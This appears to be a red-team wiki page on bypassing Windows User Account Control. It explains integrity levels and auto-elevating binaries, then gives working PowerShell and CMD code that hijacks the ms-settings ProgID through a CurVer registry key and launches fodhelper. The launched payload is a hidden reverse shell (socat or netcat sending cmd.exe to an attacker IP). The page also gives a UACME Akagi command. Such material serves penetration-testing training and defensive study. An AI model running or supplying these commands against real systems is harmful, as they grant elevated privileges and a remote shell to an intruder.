---
description: 'MITRE ATT&CK™ Impair Defenses: Disable or Modify Tools - Technique T1562.001'
---

# UAC Bypass

## Theory

The User Account Control [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works). Its a Windows security feature that forces any new process to run in the security context of a non-privileged account by default..

### Integrity Levels

UAC is a **Mandatory Integrity Control** (MIC), which is a mechanism that allows differentiating users, processes and resources by assigning an Integrity Level (IL) to each of them. In general terms, users or processes with a higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows DACLs\
The following 4 ILs are used by Windows, ordered from lowest to highest:

| Integrity Level | Use                                                |
| --------------- | -------------------------------------------------- |
| Low             | Very limited permissions                           |
| Medium          | users and Administrators' filtered tokens.         |
| High            | Administrators' elevated tokens if UAC is enabled. |
| System          | Reserved for system use.                           |

### AutoElevate

some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows. For an application, some requirements need to be met to auto-elevate:\
\- The executable must be signed by the Windows Publisher\
\- The executable must be contained in a trusted directory, like %SystemRoot%/System32/ or %ProgramFiles%/\
\- Executable files (.exe) must declare the autoElevate element inside their manifests. To check a file's manifest, we can use sigcheck.

Indeed we can leverage this executables to bypass UAC. Let's dive in:

{% hint style="danger" %}
if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate.
{% endhint %}

## Practice

Microsoft doesn't consider UAC a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges. In that sense any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched to this day.

### Using ProgID and AutoElevate binary to bypass UAC

we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.

{% tabs %}
{% tab title="Powershell" %}
The exploit code is proposed by [V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)

```bash
# Using socat
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
# Or using netcat
$program = "powershell -windowstyle hidden C:\Windows\Temp\nc64.exe 192.168.49.113 443 -e cmd.exe"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

{% hint style="danger" %}
Detected by Windowds Defender
{% endhint %}
{% endtab %}

{% tab title="CMD" %}
V3ded exploit converted in CMD by TryHackMe

```bash
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
```
{% endtab %}
{% endtabs %}

### Automated Exploitation

{% tabs %}
{% tab title="UACME" %}
While [UACME](https://github.com/hfiref0x/UACME) provides several tools, we will focus mainly on the one called **Akagi**, which runs the actual UAC bypasses\
If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:

```bash
C:\tools>UACME-Akagi64.exe 33
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/bypassinguac" %}

{% embed url="https://github.com/hfiref0x/UACME" %}

{% embed url="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses" %}
